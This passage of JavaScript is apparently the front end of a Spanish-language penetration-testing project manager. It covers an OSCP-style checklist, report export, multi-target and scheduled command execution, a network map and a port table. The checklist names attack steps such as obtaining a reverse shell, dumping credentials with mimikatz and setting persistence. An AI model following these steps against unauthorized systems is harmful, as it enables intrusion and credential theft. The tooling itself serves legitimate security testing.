    { id: 'recon_nmap_udp',     phase: 'Recon',       label: 'Nmap UDP top-20' },
    { id: 'recon_nmap_scripts', phase: 'Recon',       label: 'Nmap scripts + versiones (-sC -sV)' },
    { id: 'recon_osint',        phase: 'Recon',       label: 'OSINT / whois / shodan' },
    { id: 'enum_web',           phase: 'Enum',        label: 'Enumerar directorios web (gobuster/ferox)' },
    { id: 'enum_web_tech',      phase: 'Enum',        label: 'Identificar tecnologías web (Wappalyzer)' },
    { id: 'enum_smb',           phase: 'Enum',        label: 'Enumerar SMB (smbmap, smbclient, crackmapexec)' },
    { id: 'enum_ldap',          phase: 'Enum',        label: 'Enumerar LDAP / AD (ldapsearch, bloodhound)' },
    { id: 'enum_ftp',           phase: 'Enum',        label: 'FTP anónimo + descarga de ficheros' },
    { id: 'enum_dns',           phase: 'Enum',        label: 'DNS (zone transfer, subdomain brute)' },
    { id: 'enum_rpc',           phase: 'Enum',        label: 'RPC / NFS enumeration' },
    { id: 'exploit_vuln',       phase: 'Explotación', label: 'Identificar vulnerabilidad explotable' },
    { id: 'exploit_shell',      phase: 'Explotación', label: 'Obtener reverse shell / acceso inicial' },
    { id: 'exploit_stable',     phase: 'Explotación', label: 'Estabilizar shell (pty upgrade + stty)' },
    { id: 'exploit_flag_user',  phase: 'Explotación', label: '🚩 Capturar flag usuario (local.txt)' },
    { id: 'privesc_enum',       phase: 'PrivEsc',     label: 'Ejecutar winPEAS / linPEAS' },
    { id: 'privesc_manual',     phase: 'PrivEsc',     label: 'Revisión manual (sudo -l, SUID, cron, services)' },
    { id: 'privesc_root',       phase: 'PrivEsc',     label: 'Escalar a root / SYSTEM' },
    { id: 'privesc_flag_root',  phase: 'PrivEsc',     label: '🚩 Capturar flag root (proof.txt)' },
    { id: 'post_screenshot',    phase: 'Post-Explot.', label: 'Screenshot de prueba de compromiso' },
    { id: 'post_dump_hashes',   phase: 'Post-Explot.', label: 'Volcar credenciales (mimikatz / hashdump / shadow)' },
    { id: 'post_loot',          phase: 'Post-Explot.', label: 'Recolectar loot (configs, creds, tickets)' },
    { id: 'post_persistence',   phase: 'Post-Explot.', label: 'Establecer persistencia' },
    { id: 'post_pivot',         phase: 'Post-Explot.', label: 'Pivoting a red interna' },
];

function renderChecklist() {
    const checklist = state.activeProject?.checklist || {};
    const total = OSCP_CHECKLIST.length;
    const done  = OSCP_CHECKLIST.filter(i => checklist[i.id]).length;
    const pct   = Math.round((done / total) * 100);
    document.getElementById('checklist-stats').textContent = `${done} / ${total} completados (${pct}%)`;
    document.getElementById('checklist-progress-bar').style.width = `${pct}%`;
    const phases = [...new Set(OSCP_CHECKLIST.map(i => i.phase))];
    document.getElementById('checklist-items').innerHTML = phases.map(phase => {
        const items = OSCP_CHECKLIST.filter(i => i.phase === phase);
        const phaseDone = items.filter(i => checklist[i.id]).length;
        return `<div class="checklist-phase-title">${h(phase)} <span class="text-muted">(${phaseDone}/${items.length})</span></div>
        ${items.map(item => `
            <div class="checklist-item ${checklist[item.id] ? 'done' : ''}" onclick="toggleChecklistItem('${item.id}')">
                <input type="checkbox" ${checklist[item.id] ? 'checked' : ''} onclick="toggleChecklistItem('${item.id}'); event.stopPropagation()">
                <span class="cl-label">${h(item.label)}</span>
            </div>`).join('')}`;
    }).join('');
}

async function toggleChecklistItem(itemId) {
    const checklist = { ...(state.activeProject.checklist || {}) };
    checklist[itemId] = !checklist[itemId];
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ checklist }) });
    state.activeProject = await res.json();
    renderChecklist();
}

async function resetChecklist() {
    if (!confirm('¿Reiniciar el checklist de este proyecto?')) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ checklist: {} }) });
    state.activeProject = await res.json();
    renderChecklist();
    toast('Checklist reiniciado', 'info');
}

// ── Export ─────────────────────────────────────────────────────────────────

async function exportHTMLReport() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/report`);
    const blob = await res.blob();
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href     = url;
    a.download = `${state.activeProject.name.replace(/\s+/g,'_')}_report.html`;
    a.click();
    URL.revokeObjectURL(url);
    toast('Informe HTML exportado', 'success');
}

function exportMarkdown() {
    const p = state.activeProject;
    const now = new Date().toLocaleString('es-ES');
    let md = `# PentestSuite Report — ${p.name}\n\n`;
    md += `| Campo | Valor |\n|-------|-------|\n`;
    md += `| **Cliente** | ${p.client || '—'} |\n`;
    md += `| **Fecha** | ${now} |\n`;
    md += `| **Targets** | ${(p.targets || []).join(', ') || '—'} |\n`;
    md += `| **Dominios** | ${(p.domains || []).join(', ') || '—'} |\n`;
    md += `| **Scope** | ${p.scope || '—'} |\n\n`;
    const checklist = p.checklist || {};
    const done = OSCP_CHECKLIST.filter(i => checklist[i.id]).length;
    md += `---\n\n## Checklist (${done}/${OSCP_CHECKLIST.length})\n\n`;
    [...new Set(OSCP_CHECKLIST.map(i => i.phase))].forEach(phase => {
        md += `### ${phase}\n`;
        OSCP_CHECKLIST.filter(i => i.phase === phase).forEach(item => { md += `- [${checklist[item.id] ? 'x' : ' '}] ${item.label}\n`; });
        md += '\n';
    });
    const findings = p.findings || [];
    if (findings.length) {
        md += `---\n\n## Findings (${findings.length})\n\n`;
        findings.forEach(f => { md += `### [${f.severity?.toUpperCase()}] ${f.title}\n\n${f.description || ''}\n\n`; if (f.evidence) md += `\`\`\`\n${f.evidence}\n\`\`\`\n\n`; });
    }
    const loot = p.loot || [];
    if (loot.length) {
        md += `---\n\n## Loot (${loot.length} items)\n\n| Tipo | Valor | Fuente |\n|------|-------|--------|\n`;
        loot.forEach(l => { md += `| ${l.type} | \`${l.value}\` | ${l.source || '—'} |\n`; });
        md += '\n';
    }
    if (p.notes) md += `---\n\n## Notas\n\n${p.notes}\n\n`;
    const commands = p.commands || [];
    if (commands.length) {
        md += `---\n\n## Historial de comandos (${commands.length})\n\n`;
        const grouped = {};
        commands.forEach(cmd => { const ph = cmd.phase || 'other'; if (!grouped[ph]) grouped[ph] = []; grouped[ph].push(cmd); });
        Object.entries(grouped).forEach(([phase, cmds]) => {
            md += `### ${phase}\n\n`;
            cmds.forEach(cmd => { md += `**${cmd.tool}** — *${fmtDateTime(cmd.timestamp)}*\n\`\`\`\n${cmd.command}\n\`\`\`\n\n`; });
        });
    }
    const blob = new Blob([md], { type: 'text/markdown' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = `${p.name.replace(/\s+/g,'_')}_report.md`; a.click();
    URL.revokeObjectURL(url);
    toast('Informe exportado (.md)', 'success');
}

// ── Utilities ──────────────────────────────────────────────────────────────

function h(str) {
    if (str == null) return '';
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

function escAttr(str) { return String(str || '').replace(/\\/g,'\\\\').replace(/'/g,"\\'"); }

function fmtDate(iso) {
    if (!iso) return '';
    return new Date(iso).toLocaleDateString('es-ES', { day: '2-digit', month: '2-digit', year: 'numeric' });
}

function fmtDateTime(iso) {
    if (!iso) return '';
    return new Date(iso).toLocaleString('es-ES', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' });
}

// ── Multi-target Execution ─────────────────────────────────────────────────

function showMultiTargetModal() {
    const targets = [...(state.activeProject?.targets || []), ...(state.activeProject?.domains || [])];
    document.getElementById('mt-targets-checkboxes').innerHTML = targets.map(t => `
        <label class="mt-target-check">
            <input type="checkbox" value="${h(t)}" checked> <code>${h(t)}</code>
        </label>
    `).join('') || '<span class="text-muted small">Sin targets en el proyecto</span>';
    document.getElementById('mt-command').value = '';
    document.getElementById('mt-tool').value = '';
    document.getElementById('mt-extra-targets').value = '';
    bsMultiTarget.show();
}

async function executeMultiTarget() {
    const cmd = document.getElementById('mt-command').value.trim();
    if (!cmd) { toast('El comando no puede estar vacío', 'error'); return; }

    const checked = [...document.querySelectorAll('#mt-targets-checkboxes input:checked')].map(el => el.value);
    const extra = document.getElementById('mt-extra-targets').value.split(',').map(s => s.trim()).filter(Boolean);
    const targets = [...new Set([...checked, ...extra])];
    if (!targets.length) { toast('Selecciona al menos un target', 'error'); return; }

    bsMultiTarget.hide();
    toast(`Lanzando ${targets.length} jobs en paralelo...`, 'info');

    await fetch('/api/run/multi', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            command_template: cmd,
            targets,
            tool: document.getElementById('mt-tool').value.trim() || cmd.split(' ')[0],
            phase: 'custom',
            project_id: state.activeProject.id,
        }),
    });

    if (state.activePhase === 'terminal') await refreshJobsList();
    else await loadPhase('terminal');
}

// ── Scheduled Scans ────────────────────────────────────────────────────────

async function loadSchedules() {
    const res = await fetch(`/api/schedules?project_id=${state.activeProject.id}`);
    state.schedules = await res.json();
}

function renderSchedulesSection() {
    const el = document.getElementById('schedules-section');
    if (!el) return;
    if (!state.schedules.length) {
        el.innerHTML = '<div class="text-muted small py-2">Sin scans programados</div>';
        return;
    }
    el.innerHTML = state.schedules.map(s => `
        <div class="schedule-item">
            <div class="schedule-info">
                <div class="schedule-name">${h(s.name)}</div>
                <div class="schedule-meta">${h(s.repeat)} · Próxima: ${fmtDateTime(s.next_run)}</div>
                <code class="schedule-cmd">${h(s.command)}</code>
            </div>
            <div class="d-flex gap-1 flex-shrink-0">
                <button class="btn btn-xs ${s.enabled ? 'btn-outline-success' : 'btn-outline-secondary'}"
                        onclick="toggleSchedule('${h(s.id)}')" title="${s.enabled ? 'Pausar' : 'Activar'}">
                    <i class="fas ${s.enabled ? 'fa-pause' : 'fa-play'}"></i>
                </button>
                <button class="btn btn-xs btn-outline-danger" onclick="deleteSchedule('${h(s.id)}')" title="Eliminar">
                    <i class="fas fa-trash"></i>
                </button>
            </div>
        </div>
    `).join('');
}

function showScheduleModal() {
    const now = new Date();
    now.setMinutes(now.getMinutes() + 5);
    document.getElementById('sc-datetime').value = now.toISOString().slice(0,16);
    document.getElementById('sc-command').value = '';
    document.getElementById('sc-name').value = '';
    document.getElementById('sc-repeat').value = 'once';
    bsSchedule.show();
}

async function saveSchedule() {
    const cmd = document.getElementById('sc-command').value.trim();
    const dt  = document.getElementById('sc-datetime').value;
    if (!cmd || !dt) { toast('Comando y fecha son obligatorios', 'error'); return; }

    await fetch('/api/schedules', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            name: document.getElementById('sc-name').value.trim() || cmd.split(' ')[0],
            command: cmd,
            project_id: state.activeProject.id,
            repeat: document.getElementById('sc-repeat').value,
            next_run: new Date(dt).toISOString(),
        }),
    });
    bsSchedule.hide();
    await loadSchedules();
    renderSchedulesSection();
    toast('Scan programado', 'success');
}

async function toggleSchedule(schedId) {
    await fetch(`/api/schedules/${schedId}/toggle`, { method: 'POST' });
    await loadSchedules();
    renderSchedulesSection();
}

async function deleteSchedule(schedId) {
    await fetch(`/api/schedules/${schedId}`, { method: 'DELETE' });
    await loadSchedules();
    renderSchedulesSection();
}

// ── Network Map ────────────────────────────────────────────────────────────

const HOST_COLORS = {
    discovered:     { bg: '#21262d', border: '#8b949e', font: '#8b949e' },
    initial_access: { bg: '#2d2a1e', border: '#d29922', font: '#d29922' },
    user:           { bg: '#2d1f15', border: '#f0883e', font: '#f0883e' },
    admin:          { bg: '#2d1514', border: '#f85149', font: '#f85149' },
};

function _buildMapNodes() {
    if (!state.activeProject) return { nodes: [], edges: [] };
    const hostStatus = state.activeProject.host_status || {};
    const hosts = new Map();

    // From project targets
    for (const t of (state.activeProject.targets || [])) {
        if (!hosts.has(t)) hosts.set(t, { ip: t, label: t, services: [] });
    }

    // From loot "note" items (parsed nmap ports)
    for (const item of (state.activeProject.loot || [])) {
        if (item.type === 'note' && item.source) {
            const ip = item.source;
            if (!hosts.has(ip)) hosts.set(ip, { ip, label: ip, services: [] });
            hosts.get(ip).services.push(item.value);
        }
    }

    // From finding hosts
    for (const f of (state.activeProject.findings || [])) {
        for (const ip of (f.hosts || [])) {
            if (!hosts.has(ip)) hosts.set(ip, { ip, label: ip, services: [] });
        }
    }

    // From extra hosts added via map UI
    for (const h of (state.mapExtraHosts || [])) {
        if (!hosts.has(h.ip)) hosts.set(h.ip, { ip: h.ip, label: h.label || h.ip, services: [] });
    }

    const nodes = [...hosts.values()].map(h => {
        const status = hostStatus[h.ip] || 'discovered';
        const col = HOST_COLORS[status] || HOST_COLORS.discovered;
        const svcs = h.services.slice(0,3).join('\n') + (h.services.length > 3 ? '\n...' : '');
        return {
            id: h.ip,
            label: h.label + (svcs ? '\n' + svcs : ''),
            title: `<b>${h.ip}</b><br>${h.services.join('<br>') || 'Sin servicios detectados'}`,
            color: { background: col.bg, border: col.border, highlight: { background: col.bg, border: col.border } },
            font: { color: col.font, size: 12, face: 'Courier New' },
            shape: 'box',
            borderWidth: 2,
            _services: h.services,
            _status: status,
        };
    });

    return { nodes, edges: [] };
}

function renderNetworkMap() {
    const container = document.getElementById('network-map');
    const { nodes, edges } = _buildMapNodes();

    if (state.networkMap) {
        // Incremental update — animate new nodes
        const newNodes = nodes.filter(n => !state.mapKnownNodeIds.has(n.id));
        const updNodes = nodes.filter(n =>  state.mapKnownNodeIds.has(n.id));
        if (updNodes.length) state.mapNodes.update(updNodes);
        if (newNodes.length) {
            // Add with mass=0 then animate
            newNodes.forEach(n => {
                state.mapNodes.add({ ...n, mass: 1 });
                state.mapKnownNodeIds.add(n.id);
            });
            // Smooth fit to show new nodes
            state.networkMap.fit({ animation: { duration: 800, easingFunction: 'easeInOutQuad' } });
        }
        return;
    }

    if (!nodes.length) {
        container.innerHTML = '<div class="text-center text-muted py-5" style="padding-top:60px!important"><i class="fas fa-map fa-2x mb-2 d-block"></i>No hay hosts. Añade targets al proyecto o ejecuta nmap.</div>';
        return;
    }

    state.mapKnownNodeIds = new Set(nodes.map(n => n.id));
    state.mapNodes = new vis.DataSet(nodes);
    state.mapEdges = new vis.DataSet(edges);

    state.networkMap = new vis.Network(container, { nodes: state.mapNodes, edges: state.mapEdges }, {
        nodes: { shadow: { enabled: true, size: 10 } },
        edges: { arrows: 'to', color: { color: '#30363d' }, smooth: { type: 'curvedCW', roundness: 0.2 } },
        physics: { solver: 'forceAtlas2Based', forceAtlas2Based: { gravitationalConstant: -60, springLength: 120 } },
        interaction: { hover: true, tooltipDelay: 100 },
    });

    state.networkMap.on('click', params => {
        if (params.nodes.length) {
            const nodeId = params.nodes[0];
            const node = state.mapNodes.get(nodeId);
            state.selectedMapNode = nodeId;
            document.getElementById('mhp-ip').textContent = nodeId;
            document.getElementById('mhp-status').value = node._status || 'discovered';
            document.getElementById('mhp-services').innerHTML = node._services?.length
                ? node._services.map(s => `<span class="tag">${h(s)}</span>`).join(' ')
                : '<span class="text-muted">Sin servicios detectados</span>';
            document.getElementById('map-host-panel').classList.remove('d-none');
        } else {
            document.getElementById('map-host-panel').classList.add('d-none');
            state.selectedMapNode = null;
        }
    });
}

async function setHostStatus() {
    if (!state.selectedMapNode || !state.activeProject) return;
    const status = document.getElementById('mhp-status').value;
    const hostStatus = { ...(state.activeProject.host_status || {}), [state.selectedMapNode]: status };

    await fetch(`/api/projects/${state.activeProject.id}/host_status`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(hostStatus),
    });
    state.activeProject.host_status = hostStatus;

    const col = HOST_COLORS[status] || HOST_COLORS.discovered;
    state.mapNodes.update({
        id: state.selectedMapNode,
        color: { background: col.bg, border: col.border, highlight: { background: col.bg, border: col.border } },
        font: { color: col.font, size: 12, face: 'Courier New' },
        _status: status,
    });
    toast(`${state.selectedMapNode} → ${status}`, 'success');
}

function resetMapLayout() {
    state.networkMap?.stabilize(100);
}

async function _animatedMapRefresh() {
    if (!state.activeProject) return;
    // Reload project to get latest ports/loot, then update map incrementally
    const res = await fetch(`/api/projects/${state.activeProject.id}`);
    state.activeProject = await res.json();
    renderNetworkMap();
}

function focusProjectOnHost() {
    if (!state.selectedMapNode) return;
    state.globalVars.rhost = state.selectedMapNode;
    localStorage.setItem('pentest_global_vars', JSON.stringify(state.globalVars));
    const el = document.getElementById('gv-rhost');
    if (el) el.value = state.selectedMapNode;
    toast(`RHOST = ${state.selectedMapNode}`, 'success');
}

function showAddHostModal() {
    document.getElementById('ah-ip').value = '';
    document.getElementById('ah-label').value = '';
    document.getElementById('ah-status').value = 'discovered';
    bsAddHost.show();
}

function confirmAddHost() {
    const ip = document.getElementById('ah-ip').value.trim();
    if (!ip) { toast('IP obligatoria', 'error'); return; }
    const label = document.getElementById('ah-label').value.trim() || ip;
    const status = document.getElementById('ah-status').value;
    state.mapExtraHosts = state.mapExtraHosts || [];
    state.mapExtraHosts.push({ ip, label });
    bsAddHost.hide();
    // Destroy map and re-render with new node
    if (state.networkMap) {
        state.networkMap.destroy();
        state.networkMap = null;
    }
    renderNetworkMap();
    // Set status immediately
    state.selectedMapNode = ip;
    document.getElementById('mhp-status').value = status;
    setHostStatus();
}

async function removeHostFromMap() {
    if (!state.selectedMapNode) return;
    state.mapNodes.remove(state.selectedMapNode);
    state.mapExtraHosts = (state.mapExtraHosts || []).filter(h => h.ip !== state.selectedMapNode);
    // Remove from host_status
    const hostStatus = { ...(state.activeProject.host_status || {}) };
    delete hostStatus[state.selectedMapNode];
    state.activeProject.host_status = hostStatus;
    await fetch(`/api/projects/${state.activeProject.id}/host_status`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(hostStatus),
    });
    document.getElementById('map-host-panel').classList.add('d-none');
    state.selectedMapNode = null;
}

// ── Timeline ───────────────────────────────────────────────────────────────

const TL_CONFIG = {
    project_created: { icon: 'fa-rocket',           color: 'var(--green)',  label: 'Inicio' },
    command:         { icon: 'fa-terminal',          color: 'var(--muted)',  label: 'Comando' },
    job:             { icon: 'fa-play-circle',       color: 'var(--blue)',   label: 'Job' },
    loot:            { icon: 'fa-gem',               color: 'var(--yellow)', label: 'Loot' },
    finding:         { icon: 'fa-bug',               color: 'var(--red)',    label: 'Finding' },
};

async function loadTimeline() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/timeline`);
    state.timelineEvents = await res.json();
    renderTimeline();
}

function filterTimeline(filter) {
    state.timelineFilter = filter;
    document.querySelectorAll('.timeline-filter').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.filter === filter);
    });
    renderTimeline();
}

function renderTimeline() {
    const events = state.timelineFilter === 'all'
        ? state.timelineEvents
        : state.timelineEvents.filter(e => e.type === state.timelineFilter);

    const el = document.getElementById('timeline-list');
    if (!events.length) {
        el.innerHTML = '<div class="text-center text-muted py-5"><i class="fas fa-timeline fa-2x mb-2 d-block"></i>Sin eventos</div>';
        return;
    }

    const SEV_C = { critical: '#f85149', high: '#f0883e', medium: '#d29922', low: '#3fb950', info: '#58a6ff' };

    el.innerHTML = events.map(ev => {
        const cfg = TL_CONFIG[ev.type] || { icon: 'fa-circle', color: 'var(--muted)', label: ev.type };
        const col = ev.severity ? SEV_C[ev.severity] || cfg.color : cfg.color;
        const statusBadge = ev.status ? `<span class="job-meta ms-2">${h(ev.status)}</span>` : '';
        return `
        <div class="timeline-item">
            <div class="timeline-dot" style="background:${col}; border-color:${col}"></div>
            <div class="timeline-content">
                <div class="timeline-header">
                    <span class="timeline-type" style="color:${col}">
                        <i class="fas ${cfg.icon}"></i> ${cfg.label}
                    </span>
                    ${statusBadge}
                    <span class="timeline-ts">${fmtDateTime(ev.ts)}</span>
                </div>
                <div class="timeline-title">${h(ev.title)}</div>
                ${ev.desc ? `<div class="timeline-desc">${h(ev.desc)}</div>` : ''}
            </div>
        </div>`;
    }).join('');
}

// ── YAML Editor ────────────────────────────────────────────────────────────

async function loadYAMLFileList() {
    const res = await fetch('/api/tools/files');
    const files = await res.json();
    const el = document.getElementById('yaml-file-list');
    el.innerHTML = files.map(name => `
        <div class="yaml-file-item ${name === state.currentYamlFile ? 'active' : ''}"
             onclick="openYAMLFile('${h(name)}')">
            <i class="fas fa-file-code" style="font-size:11px;color:var(--yellow)"></i>
            <span>${h(name)}.yaml</span>
        </div>
    `).join('');
    if (state.currentYamlFile && !files.includes(state.currentYamlFile)) {
        state.currentYamlFile = null;
    }
}

async function openYAMLFile(name) {
    if (state.currentYamlFile === name) return;
    const res = await fetch(`/api/tools/files/${name}`);
    if (!res.ok) { toast('Error al abrir fichero', 'error'); return; }
    const data = await res.json();
    state.currentYamlFile = name;
    document.getElementById('yaml-editor').value = data.content;
    document.getElementById('editor-filename').textContent = `${name}.yaml`;
    document.getElementById('btn-save-yaml').disabled = true;
    document.getElementById('editor-dirty-badge').classList.add('d-none');
    document.getElementById('editor-status').textContent = 'Listo';
    loadYAMLFileList();
}

function onYamlEditorInput() {
    document.getElementById('btn-save-yaml').disabled = false;
    document.getElementById('editor-dirty-badge').classList.remove('d-none');
    document.getElementById('editor-status').textContent = 'Modificado';
}

async function saveYAML() {
    if (!state.currentYamlFile) return;
    const content = document.getElementById('yaml-editor').value;
    const res = await fetch(`/api/tools/files/${state.currentYamlFile}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content }),
    });
    const data = await res.json();
    if (data.error) { toast(`Error: ${data.error}`, 'error'); return; }
    document.getElementById('btn-save-yaml').disabled = true;
    document.getElementById('editor-dirty-badge').classList.add('d-none');
    document.getElementById('editor-status').textContent = '✓ Guardado';
    toast(`${state.currentYamlFile}.yaml guardado`, 'success');
}

function showNewYamlModal() {
    document.getElementById('ny-name').value = '';
    bsNewYaml.show();
}

async function createNewYamlFile() {
    const name = document.getElementById('ny-name').value.trim().replace(/[^a-zA-Z0-9_-]/g,'');
    if (!name) { toast('Nombre inválido', 'error'); return; }
    const res = await fetch(`/api/tools/files/${name}`, { method: 'POST' });
    const data = await res.json();
    if (data.error) { toast(data.error, 'error'); return; }
    bsNewYaml.hide();
    await loadYAMLFileList();
    openYAMLFile(name);
    toast(`${name}.yaml creado`, 'success');
}

// ── Global Search ──────────────────────────────────────────────────────────

const SEARCH_TYPE_ICONS = {
    project: 'fa-folder text-success',
    target:  'fa-crosshairs text-blue',
    loot:    'fa-gem text-warning',
    finding: 'fa-bug text-danger',
    command: 'fa-terminal text-muted',
    note:    'fa-sticky-note text-muted',
};

let _searchTimeout = null;

async function performGlobalSearch() {
    clearTimeout(_searchTimeout);
    const q = document.getElementById('global-search-input').value.trim();
    if (q.length < 2) {
        document.getElementById('global-search-results').innerHTML = '';
        return;
    }
    _searchTimeout = setTimeout(async () => {
        const res = await fetch(`/api/search?q=${encodeURIComponent(q)}`);
        const results = await res.json();
        renderSearchResults(results, q);
    }, 250);
}

function renderSearchResults(results, q) {
    const el = document.getElementById('global-search-results');
    if (!results.length) {
        el.innerHTML = '<div class="search-no-results">Sin resultados para <strong>' + h(q) + '</strong></div>';
        return;
    }
    el.innerHTML = results.map(r => {
        const icon = SEARCH_TYPE_ICONS[r.type] || 'fa-circle text-muted';
        const highlight = str => str.replace(new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'), 'gi'), m => `<mark>${h(m)}</mark>`);
        return `
        <div class="search-result-item" onclick="navigateToSearchResult('${h(r.project_id)}', '${h(r.type)}')">
            <i class="fas ${icon} search-result-icon"></i>
            <div class="search-result-body">
                <div class="search-result-value">${highlight(r.value)}</div>
                <div class="search-result-meta">${h(r.type)} · ${h(r.project_name)} ${r.desc ? '· ' + h(r.desc) : ''}</div>
            </div>
        </div>`;
    }).join('');
}

async function navigateToSearchResult(projectId, type) {
    bsSearch.hide();
    if (projectId !== state.activeProject?.id) await selectProject(projectId);
    const phaseMap = { loot: 'loot', finding: 'findings', command: 'history', target: 'recon', note: 'recon', project: 'recon' };
    await loadPhase(phaseMap[type] || 'recon');
}

// ── Output Diff ────────────────────────────────────────────────────────────

async function showOutputDiff() {
    if (!state.jobs.length) { toast('No hay jobs para comparar', 'error'); return; }

    const completedJobs = state.jobs.filter(j => j.status !== 'running');
    if (completedJobs.length < 2) { toast('Se necesitan al menos 2 jobs completados', 'error'); return; }

    const makeOptions = jobs => jobs.map(j =>
        `<option value="${h(j.id)}">${h(j.tool)} — ${fmtDateTime(j.started_at)}</option>`
    ).join('');

    document.getElementById('diff-job-a').innerHTML = makeOptions(completedJobs);
    document.getElementById('diff-job-b').innerHTML = makeOptions(completedJobs.slice(1));
    document.getElementById('diff-job-b').selectedIndex = 1;
    document.getElementById('diff-output').innerHTML = '';
    bsDiff.show();
    await renderDiff();
}

async function renderDiff() {
    const idA = document.getElementById('diff-job-a').value;
    const idB = document.getElementById('diff-job-b').value;
    if (!idA || !idB || idA === idB) {
        document.getElementById('diff-output').innerHTML = '<div class="text-muted small p-3">Selecciona dos jobs diferentes</div>';
        return;
    }

    const [resA, resB] = await Promise.all([fetch(`/api/jobs/${idA}`), fetch(`/api/jobs/${idB}`)]);
    const [jobA, jobB] = await Promise.all([resA.json(), resB.json()]);

    const linesA = jobA.output || [];
    const linesB = jobB.output || [];
    const setB = new Set(linesB);
    const setA = new Set(linesA);

    const html = [];
    for (const line of linesA) {
        if (setB.has(line)) html.push(`<div class="diff-same">${h(line)}</div>`);
        else html.push(`<div class="diff-removed">- ${h(line)}</div>`);
    }
    for (const line of linesB) {
        if (!setA.has(line)) html.push(`<div class="diff-added">+ ${h(line)}</div>`);
    }

    document.getElementById('diff-output').innerHTML = html.join('') || '<div class="text-muted small p-3">Sin diferencias</div>';
}

// ══════════════════════════════════════════════════════════════════════════════
//  PORT MAP
// ══════════════════════════════════════════════════════════════════════════════

async function loadPortMap() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/ports`);
    state.ports = await res.json();
    renderPortMap();
}

function renderPortMap() {
    const tbody = document.getElementById('ports-tbody');
    const empty = document.getElementById('ports-empty');
    const wrap  = document.getElementById('ports-table-wrap');
    if (!state.ports || state.ports.length === 0) {
        empty.classList.remove('d-none');
        wrap.style.display = 'none';
        return;
    }
    empty.classList.add('d-none');
    wrap.style.display = '';
    const colMap = {
        http:'var(--blue)', https:'var(--blue)', ftp:'var(--orange)',
        ssh:'var(--green)', smb:'var(--yellow)', ldap:'var(--purple)',
        rdp:'var(--red)', mysql:'var(--orange)', mssql:'var(--orange)',
        postgresql:'var(--blue)', dns:'var(--muted)', smtp:'var(--orange)',
        kerberos:'var(--purple)', winrm:'var(--yellow)',
    };
    tbody.innerHTML = state.ports.map((p, i) => {
        const col = colMap[(p.service || '').toLowerCase()] || 'var(--muted)';
        return `<tr>
            <td class="font-monospace text-success">${h(p.host || '')}</td>
            <td><strong>${p.port}</strong></td>
            <td><span class="badge bg-secondary">${h(p.proto || 'tcp')}</span></td>
            <td><span style="color:${col}">${h(p.service || '')}</span></td>
            <td class="text-muted small">${h(p.version || '')}</td>
            <td class="text-end">
                <button class="btn btn-xs btn-outline-primary me-1"
                    onclick="openToolsForService('${h(p.service || '')}','${h(p.host || '')}',${p.port})"
                    title="Ver tools para este servicio"><i class="fas fa-wrench"></i></button>
                <button class="btn btn-xs btn-outline-danger" onclick="removePort(${i})"><i class="fas fa-times"></i></button>
            </td>
        </tr>`;
    }).join('');
}

function openToolsForService(service, host, port) {
    const m = {
        http:'web_attacks', https:'web_attacks', ftp:'enum', ssh:'enum',
        smb:'enum', 'netbios-ssn':'enum', 'microsoft-ds':'enum',
        ldap:'ad_attacks', kerberos:'ad_attacks', msrpc:'ad_attacks',
        rdp:'exploitation', mysql:'exploitation', mssql:'exploitation',
        'ms-sql-s':'exploitation',
    };
    const phase = m[(service || '').toLowerCase()] || 'recon';
    if (host) { state.globalVars.rhost = host; document.getElementById('gv-rhost').value = host; saveGlobalVar('rhost', host); }
    loadPhase(phase);
    setTimeout(() => {
        const si = document.getElementById('tool-search');
        si.value = service || '';
        filterTools();
    }, 350);
}

async function importPortsFromLoot() {
    if (!state.activeProject) return;
    const project = await (await fetch(`/api/projects/${state.activeProject.id}`)).json();
    const portRe = /^(\d+)\/(tcp|udp)\s+(\S+)\s*(.*)/;
    let added = 0;
    for (const item of (project.loot || [])) {
        const m = item.value && item.value.match(portRe);
        if (!m) continue;
        const port = { host: item.source || state.globalVars.rhost || '', port: parseInt(m[1]), proto: m[2], service: m[3], version: m[4].trim() };
        if (!state.ports.some(p => p.port === port.port && p.proto === port.proto && p.host === port.host)) {
            state.ports.push(port); added++;
        }
    }
    if (added === 0) { toast('No hay puertos en Loot para importar', 'info'); return; }
    await savePorts();
    renderPortMap();
    toast(`${added} puertos importados`, 'success');
}

async function savePorts() {
    if (!state.activeProject) return;
    await fetch(`/api/projects/${state.activeProject.id}/ports`, {
        method: 'PUT', headers: {'Content-Type':'application/json'}, body: JSON.stringify(state.ports),
    });
}

async function removePort(idx) {
    state.ports.splice(idx, 1);
    await savePorts();
    renderPortMap();
}

function showAddPortModal() {
    document.getElementById('ap-host').value = state.globalVars.rhost || '';
    document.getElementById('ap-port').value = '';
    document.getElementById('ap-service').value = '';
    document.getElementById('ap-version').value = '';
    bsAddPort.show();
}

async function addPort() {
    const port = {
        host: document.getElementById('ap-host').value.trim(),
        port: parseInt(document.getElementById('ap-port').value) || 0,
        proto: document.getElementById('ap-proto').value,
        service: document.getElementById('ap-service').value.trim(),
        version: document.getElementById('ap-version').value.trim(),
    };
    if (!port.port) { toast('Puerto requerido', 'error'); return; }
    state.ports.push(port);
    await savePorts();
    renderPortMap();
    bsAddPort.hide();
    toast('Puerto añadido', 'success');
}

// ══════════════════════════════════════════════════════════════════════════════
